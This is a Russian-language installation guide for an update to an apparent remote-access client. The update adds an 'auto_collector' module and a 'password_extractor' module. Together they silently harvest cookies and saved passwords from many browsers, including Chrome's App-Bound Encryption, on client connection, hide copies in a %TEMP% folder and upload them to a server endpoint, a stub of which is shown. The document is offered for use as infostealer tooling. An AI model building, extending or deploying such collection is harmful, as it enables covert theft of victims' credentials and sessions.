# Инструкция по установке обновлений Auto-Collector

## Что изменено

1. **auto_collector/** - новый модуль автоматического сбора данных
   - Автоматически собирает cookies и пароли при подключении клиента
   - Работает в фоновом потоке, не блокирует основную работу
   - Отправляет собранные данные на сервер автоматически

2. **password_extractor/** - модуль извлечения паролей
   - Расширенная поддержка браузеров (добавлены Yandex, Dolphin Anty, CentBrowser, CocCoc, Chromium)
   - Поддержка множественных профилей браузера
   - Поддержка App-Bound Encryption (Chrome 127+)

3. **main.py** - обновлен для интеграции auto_collector

## Структура файлов в архиве

```
updated_files/
├── main.py                          → client/remote_client/main.py
├── auto_collector/
│   ├── __init__.py                  → client/remote_client/auto_collector/__init__.py
│   └── collector.py                 → client/remote_client/auto_collector/collector.py
└── password_extractor/
    ├── __init__.py                  → client/remote_client/password_extractor/__init__.py
    └── extractor.py                 → client/remote_client/password_extractor/extractor.py
```

## Установка

1. Распакуйте архив `rc_auto_collector_update.zip`

2. Создайте папки в вашем проекте (если не существуют):
   ```
   client/remote_client/auto_collector/
   client/remote_client/password_extractor/
   ```

3. Скопируйте файлы:
   - `updated_files/main.py` → `client/remote_client/main.py`
   - `updated_files/auto_collector/*` → `client/remote_client/auto_collector/`
   - `updated_files/password_extractor/*` → `client/remote_client/password_extractor/`

## Переменные окружения для управления

| Переменная | Значение по умолчанию | Описание |
|------------|----------------------|----------|
| `RC_AUTO_COLLECT` | `1` | Включить/выключить авто-сбор (`0` = выкл) |
| `RC_COLLECT_COOKIES` | `1` | Собирать cookies (`0` = выкл) |
| `RC_COLLECT_PASSWORDS` | `1` | Собирать пароли (`0` = выкл) |
| `RC_COLLECT_PROFILES` | `0` | Собирать профили (`1` = вкл) |
| `RC_COLLECT_DELAY` | `2.0` | Задержка перед сбором (секунды) |
| `RC_COLLECT_SEND` | `1` | Отправлять данные на сервер (`0` = только локально) |

## Пример использования

### В config файле клиента:
```bash
# Включить авто-сбор
RC_AUTO_COLLECT=1
RC_COLLECT_COOKIES=1
RC_COLLECT_PASSWORDS=1

# С задержкой 5 секунд
RC_COLLECT_DELAY=5.0
```

### Для отключения авто-сбора:
```bash
RC_AUTO_COLLECT=0
```

## Как работает

1. При запуске клиента, после инициализации, создается фоновый поток `auto_collector`
2. После небольшой задержки (RC_COLLECT_DELAY) начинается сбор данных
3. Собираются cookies из всех доступных браузеров
4. Собираются пароли из всех доступных браузеров
5. Данные сохраняются локально в `%TEMP%/.rc_data/`
6. Если включена отправка (RC_COLLECT_SEND=1), данные отправляются на сервер

## Серверная часть

На сервере должен быть endpoint `/api/collected-data` для приема данных:

```python
@app.post("/api/collected-data")
async def receive_collected_data(request):
    data = await request.json()
    # data содержит:
    # - session_id: ID сессии клиента
    # - data_type: "cookies" или "passwords"
    # - data: base64-закодированный JSON с данными
    # - item_count: количество элементов
    # - browsers: список браузеров
    # - timestamp: время сбора
    pass
```

## Важно

- Все данные передаются по защищенному соединению (если используется HTTPS/WSS)
- Локальные копии данных хранятся временно в `%TEMP%/.rc_data/`
- При ошибках сбора клиент продолжает работу без прерывания
